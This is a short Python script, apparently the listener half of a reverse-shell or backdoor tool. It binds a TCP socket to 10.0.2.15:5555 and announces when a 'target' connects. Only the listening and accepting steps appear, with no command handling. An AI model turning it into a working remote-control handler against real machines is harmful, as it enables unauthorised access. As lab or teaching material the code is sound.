import socket


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("10.0.2.15", 5555))
print("[+] Listening for Incoming Connections")
sock.listen(5)
target, ip = sock.accept()
print(f"[+] Target Connected From: {str(ip)}")
